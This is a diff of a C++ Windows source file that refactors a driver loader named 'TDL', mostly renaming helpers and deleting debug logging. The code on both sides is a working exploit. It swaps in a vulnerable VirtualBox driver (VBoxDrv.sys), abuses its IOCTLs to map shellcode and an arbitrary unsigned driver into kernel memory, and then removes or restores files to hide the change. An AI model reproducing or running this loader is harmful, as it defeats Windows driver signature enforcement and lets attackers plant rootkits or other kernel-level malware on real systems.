@@ -1,10 +1,10 @@
 #include "TDL.h"
-#include <Headers.hpp>
+#include <headers.hpp>
 #include <process.h>
 #include "vbox.h"
 
-#include <Misc/NtHelpers.hpp>
-#include <System/Driver/Shellcode.hpp>
+#include <misc/winnt.hpp>
+#include <system/driver/driver_shellcode.hpp>
 
 HINSTANCE  g_hInstance;
 HANDLE     g_ConOut = NULL;
@@ -19,106 +19,80 @@ WCHAR szVBoxBackup[MAX_PATH];
 #define supImageHandle  0x1a000
 #define scDataOffset    0x214 //shellcode data offset
 
-using namespace Resurgence;
+using namespace resurgence;
 
 BOOL IsVBoxInstalled()
 {
-    BOOL found = FALSE;
-    return NT_SUCCESS(Misc::NtHelpers::SystemObjectExists(L"\\Device", L"VBoxDrv", &found)) && found == TRUE;
+    bool found = false;
+    return NT_SUCCESS(misc::winnt::object_exists(L"\\Device", L"VBoxDrv", &found)) && found;
 }
 BOOL StopVBoxServices(SC_HANDLE hSCManager)
 {
-    using namespace Misc;
+    using namespace misc;
 
-    if(!NT_SUCCESS(NtHelpers::StopDriver(hSCManager, L"VBoxNetAdp")))
-        return FALSE;
-    LOG(DEBUG) << "Stopped VBoxNetAdp";
-    if(!NT_SUCCESS(NtHelpers::StopDriver(hSCManager, L"VBoxNetLwf")))
-        return FALSE;
-    LOG(DEBUG) << "Stopped VBoxNetLwf";
-    if(!NT_SUCCESS(NtHelpers::StopDriver(hSCManager, L"VBoxUSBMon")))
-        return FALSE;
-    LOG(DEBUG) << "Stopped VBoxUSBMon";
-    if(!NT_SUCCESS(NtHelpers::StopDriver(hSCManager, L"VBoxDrv")))
-        return FALSE;
-    LOG(DEBUG) << "Stopped VBoxDrv";
-    return TRUE;
+    return NT_SUCCESS(winnt::stop_driver(hSCManager, L"VBoxNetAdp")) &&
+           NT_SUCCESS(winnt::stop_driver(hSCManager, L"VBoxNetLwf")) &&
+           NT_SUCCESS(winnt::stop_driver(hSCManager, L"VBoxUSBMon")) &&
+           NT_SUCCESS(winnt::stop_driver(hSCManager, L"VBoxDrv"));
 }
 BOOL BackupVBoxDriver()
 {
-    LOG(DEBUG) << "Backing up VBox driver to " << szVBoxBackup;
-    return NT_SUCCESS(Misc::NtHelpers::CopyFile(szVBoxDriver, szVBoxBackup));
+    return NT_SUCCESS(misc::winnt::copy_file(szVBoxDriver, szVBoxBackup));
 }
 BOOL RestoreVBoxDriver()
 {
-    LOG(DEBUG) << "Restoring VBox driver to " << szVBoxDriver;
-    return NT_SUCCESS(Misc::NtHelpers::CopyFile(szVBoxBackup, szVBoxDriver));
+    return NT_SUCCESS(misc::winnt::copy_file(szVBoxBackup, szVBoxDriver));
 }
 HANDLE StartVulnerableDriver(SC_HANDLE hSCManager)
 {
-    using namespace Misc;
-
-    LOG(DEBUG) << "Starting Vulnerable Driver";
-
+    using namespace misc;
+    
     HANDLE hVulnerableDriver = INVALID_HANDLE_VALUE;
     BOOL vbox_installed = IsVBoxInstalled();
     if(vbox_installed) {
-        LOG(DEBUG) << "VirtualBox is installed.";
         if(!StopVBoxServices(hSCManager) || !BackupVBoxDriver())
             return INVALID_HANDLE_VALUE;
     }
 
-    NtHelpers::WriteBufferToFile(szVBoxDriver, (LPVOID)SHELLCODE_VULNERABLE_DRIVER, SHELLCODE_VULNERABLE_DRIVER_SIZE);
+    winnt::write_file(szVBoxDriver, SHELLCODE_VULNERABLE_DRIVER, SHELLCODE_VULNERABLE_DRIVER_SIZE);
 
     if(!vbox_installed) {
-        LOG(DEBUG) << "VirtualBox is NOT installed.";
         LOG(DEBUG) << "Adding VBoxDrv to the database";
-        NtHelpers::CreateDriverService(hSCManager, L"VBoxDrv", szVBoxDriver);
+        winnt::create_service(hSCManager, L"VBoxDrv", szVBoxDriver);
     }
 
-    if(NT_SUCCESS(NtHelpers::StartDriver(hSCManager, L"VBoxDrv"))) {
-        if(NT_SUCCESS(NtHelpers::GetDeviceHandle(L"VBoxDrv", &hVulnerableDriver)))
-            LOG(DEBUG) << "Vulnerable driver loaded and opened";
-        else
-            LOG(DEBUG) << "Driver device open failure";
+    if(NT_SUCCESS(winnt::start_driver(hSCManager, L"VBoxDrv"))) {
+        if(!NT_SUCCESS(winnt::get_driver_device(L"VBoxDrv", &hVulnerableDriver)))
+            LOG(DEBUG) << "VBoxDrv device open failure";
+    } else {
+        LOG(DEBUG) << "Failed to load VBoxDrv";
     }
-
     return hVulnerableDriver;
 }
 BOOL StopVulnerableDriver(SC_HANDLE hSCManager, HANDLE hVulnerableDriver)
 {
-    using namespace Misc;
+    using namespace misc;
 
     UNICODE_STRING     uStr;
     OBJECT_ATTRIBUTES  ObjectAttributes;
 
-    LOG(DEBUG) << "Stopping Vulnerable Driver";
-
     if(hVulnerableDriver != INVALID_HANDLE_VALUE)
         CloseHandle(hVulnerableDriver);
 
-    if(NT_SUCCESS(NtHelpers::StopDriver(hSCManager, L"VBoxDrv")))
-        LOG(DEBUG) << "Vulnerable driver successfully unloaded";
-    else {
+    if(!NT_SUCCESS(winnt::stop_driver(hSCManager, L"VBoxDrv"))) {
         LOG(DEBUG) << "Unexpected error while unloading driver";
     }
 
     if(!IsVBoxInstalled()) {
-        if(NT_SUCCESS(NtHelpers::DeleteDriverService(hSCManager, L"VBoxDrv")))
-            LOG(DEBUG) << "Driver entry removed from registry";
-        else
+        if(!NT_SUCCESS(winnt::delete_service(hSCManager, L"VBoxDrv")))
             LOG(DEBUG) << "Error removing driver entry from registry";
 
         RtlInitUnicodeString(&uStr, L"\\??\\globalroot\\systemroot\\system32\\drivers\\VBoxDrv.sys");
         InitializeObjectAttributes(&ObjectAttributes, &uStr, OBJ_CASE_INSENSITIVE, NULL, NULL);
-        if(NT_SUCCESS(NtDeleteFile(&ObjectAttributes)))
-            LOG(DEBUG) << "Driver file removed";
-        else
+        if(!NT_SUCCESS(NtDeleteFile(&ObjectAttributes)))
             LOG(DEBUG) << "Error removing driver file";
     } else {
-        if(RestoreVBoxDriver())
-            LOG(DEBUG) << "Original driver restored";
-        else
+        if(!RestoreVBoxDriver())
             LOG(DEBUG) << "Unexpected error while restoring original driver";
 
     }
@@ -282,16 +256,12 @@ void TDLExploit(
         Cookie.u.In.u32MinVersion = 0x00070002;
         RtlCopyMemory(Cookie.u.In.szMagic, SUPCOOKIE_MAGIC, sizeof(SUPCOOKIE_MAGIC));
 
-        LOG(DEBUG) << "TDL: Acquiring session cookie";
-
         if(!DeviceIoControl(hVBox, SUP_IOCTL_COOKIE,
             &Cookie, SUP_IOCTL_COOKIE_SIZE_IN, &Cookie,
             SUP_IOCTL_COOKIE_SIZE_OUT, &bytesIO, NULL)) {
             LOG(ERROR) << "TDL: SUP_IOCTL_COOKIE call failed";
             break;
         }
-
-        LOG(DEBUG) << "TDL: Success. Cookie: " << Cookie.u.Out.u32Cookie;
 
         RtlSecureZeroMemory(&OpenLdr, sizeof(OpenLdr));
         OpenLdr.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
@@ -308,9 +278,10 @@ void TDLExploit(
             SUP_IOCTL_LDR_OPEN_SIZE_OUT, &bytesIO, NULL)) {
             LOG(ERROR) << "TDL: SUP_IOCTL_LDR_OPEN call failed";
             break;
-        } else {
-            LOG(DEBUG) << "TDL: OpenLdr.u.Out.pvImageBase = 0x" << OpenLdr.u.Out.pvImageBase;
         }
+        //else {
+        //    LOG(DEBUG) << "TDL: OpenLdr.u.Out.pvImageBase = 0x" << OpenLdr.u.Out.pvImageBase;
+        //}
 
         ImageBase = OpenLdr.u.Out.pvImageBase;
 
@@ -342,8 +313,6 @@ void TDLExploit(
             pLoadTask, SUP_IOCTL_LDR_LOAD_SIZE_OUT, &bytesIO, NULL)) {
             LOG(ERROR) << "TDL: SUP_IOCTL_LDR_LOAD call failed";
             break;
-        } else {
-            LOG(DEBUG) << "TDL: SUP_IOCTL_LDR_LOAD success. Shellcode mapped to ntoskrnl";
         }
 
         RtlSecureZeroMemory(&vmFast, sizeof(vmFast));
@@ -360,18 +329,12 @@ void TDLExploit(
             &vmFast, SUP_IOCTL_SET_VM_FOR_FAST_SIZE_OUT, &bytesIO, NULL)) {
             LOG(DEBUG) << "TDL: SUP_IOCTL_SET_VM_FOR_FAST call failed";
             break;
-        } else {
-            LOG(DEBUG) << "TDL: SUP_IOCTL_SET_VM_FOR_FAST call complete";
         }
-
-        LOG(DEBUG) << "TDL: SUP_IOCTL_FAST_DO_NOP";
 
         paramOut = 0;
         DeviceIoControl(hVBox, SUP_IOCTL_FAST_DO_NOP,
             NULL, 0,
             &paramOut, sizeof(paramOut), &bytesIO, NULL);
-
-        LOG(DEBUG) << "TDL: SUP_IOCTL_LDR_FREE";
 
         RtlSecureZeroMemory(&ldrFree, sizeof(ldrFree));
         ldrFree.Hdr.u32Cookie = Cookie.u.Out.u32Cookie;
@@ -415,22 +378,18 @@ long __stdcall TDLMapDriver(
     PBYTE              Buffer = NULL;
     UNICODE_STRING     uStr;
     ANSI_STRING        routineName;
-    NTSTATUS           status;
+    ntstatus_code           status;
     RTL_PROCESS_MODULE_INFORMATION ntos;
     RtlZeroMemory(&ntos, sizeof(ntos));
-    Resurgence::Misc::NtHelpers::GetSystemModuleInfo("ntoskrnl.exe", &ntos);
+    resurgence::misc::winnt::get_system_module_info("ntoskrnl.exe", &ntos);
     while(ntos.ImageBase) {
 
-        LOG(DEBUG) << "TDL: System base: " << ntos.ImageBase;
-        
         RtlSecureZeroMemory(&uStr, sizeof(uStr));
         RtlInitUnicodeString(&uStr, lpDriverFullName);
         status = LdrLoadDll(NULL, NULL, &uStr, (PVOID*)&Image);
         if((!NT_SUCCESS(status)) || (Image == NULL)) {
             LOG(ERROR) << "TDL: Error. Input driver not loaded";
             break;
-        } else {
-            LOG(DEBUG) << "TDL: Input driver file loaded at 0x" << (PVOID)Image;
         }
 
         FileHeader = RtlImageNtHeader(Image);
@@ -439,33 +398,24 @@ long __stdcall TDLMapDriver(
 
         isz = FileHeader->OptionalHeader.SizeOfImage;
 
-        LOG(DEBUG) << "TDL: Loading ntoskrnl.exe";
-
         RtlInitUnicodeString(&uStr, L"ntoskrnl.exe");
         status = LdrLoadDll(NULL, NULL, &uStr, (PVOID*)&KernelImage);
         if((!NT_SUCCESS(status)) || (KernelImage == 0)) {
             LOG(ERROR) << "TDL: Error. ntoskrnl.exe not loaded";
             break;
-        } else {
-            LOG(DEBUG) << "TDL: ntoskrnl.exe loaded at 0x" << (PVOID)KernelImage;
         }
-
         RtlInitString(&routineName, "ExAllocatePoolWithTag");
         status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID*)&xExAllocatePoolWithTag);
         if((!NT_SUCCESS(status)) || (xExAllocatePoolWithTag == 0)) {
             LOG(ERROR) << "TDL: Error. ExAllocatePoolWithTag not found";
             break;
-        } else {
-            LOG(DEBUG) << "TDL: ExAllocatePoolWithTag 0x" << (PVOID)((ULONG_PTR)ntos.ImageBase + (xExAllocatePoolWithTag - KernelImage));
-        }
+        } 
 
         RtlInitString(&routineName, "PsCreateSystemThread");
         status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID*)&xPsCreateSystemThread);
         if((!NT_SUCCESS(status)) || (xPsCreateSystemThread == 0)) {
             LOG(ERROR) << "TDL: Error. PsCreateSystemThread not found";
             break;
-        } else {
-            LOG(DEBUG) << "TDL: PsCreateSystemThread 0x" << (PVOID)((ULONG_PTR)ntos.ImageBase + (xPsCreateSystemThread - KernelImage));
         }
 
         memIO = isz + PAGE_SIZE;
@@ -474,8 +424,6 @@ long __stdcall TDLMapDriver(
         if(Buffer == NULL) {
             LOG(ERROR) << "TDL: Error, unable to allocate shellcode";
             break;
-        } else {
-            LOG(DEBUG) << "TDL: Shellcode allocated at 0x" << (PVOID)Buffer;
         }
 
         // mov rcx, ExAllocatePoolWithTag
@@ -493,10 +441,8 @@ long __stdcall TDLMapDriver(
         RtlCopyMemory(Buffer + 0x14, SHELLCODE_LOADER, SHELLCODE_LOADER_SIZE);
         RtlCopyMemory(Buffer + scDataOffset, Image, isz);
 
-        LOG(DEBUG) << "TDL: Resolving kernel import";
         TDLResolveKernelImport((ULONG_PTR)Buffer + scDataOffset, KernelImage, (ULONG_PTR)ntos.ImageBase);
 
-        LOG(DEBUG) << "TDL: Executing exploit";
         TDLExploit(hVBox, Buffer, isz + PAGE_SIZE);
         break;
     }
@@ -509,22 +455,20 @@ long __stdcall TDLMapDriver(
     return status;
 }
 
-long __stdcall TDLLoadDriver(
+long __stdcall TDLload_driver(
     LPCWSTR lpDriverFullName)
 {
 
-    NTSTATUS status;
+    ntstatus_code status;
     SC_HANDLE hSCManager;
-
-    LOG(DEBUG) << "Starting load";
 
     RtlZeroMemory(szVBoxDriver, sizeof(szVBoxDriver));
     if(!GetSystemDirectoryW(szVBoxDriver, MAX_PATH))
-        return GetLastNtStatus();
+        return get_last_ntstatus();
     if(FAILED(StringCbCatW(szVBoxDriver, MAX_PATH, L"\\drivers\\VBoxDrv.sys")))
-        return GetLastNtStatus();
+        return get_last_ntstatus();
     if(FAILED(StringCbCatW(szVBoxBackup, MAX_PATH, L"\\drivers\\VBoxDrv.sys.backup")))
-        return GetLastNtStatus();
+        return get_last_ntstatus();
 
     hSCManager = OpenSCManager(NULL,
         NULL,
@@ -535,10 +479,7 @@ long __stdcall TDLLoadDriver(
     if(hVulnerableDriver != INVALID_HANDLE_VALUE) {
         if(!NT_SUCCESS(status = TDLMapDriver(hVulnerableDriver, lpDriverFullName))) {
             LOG(DEBUG) << "Failed to map driver.";
-        } else {
-            LOG(DEBUG) << "Driver mapped sucessfully";
-            status = STATUS_SUCCESS;
-        }
+        } 
         StopVulnerableDriver(hSCManager, hVulnerableDriver);
     } else {
         status = STATUS_UNSUCCESSFUL;
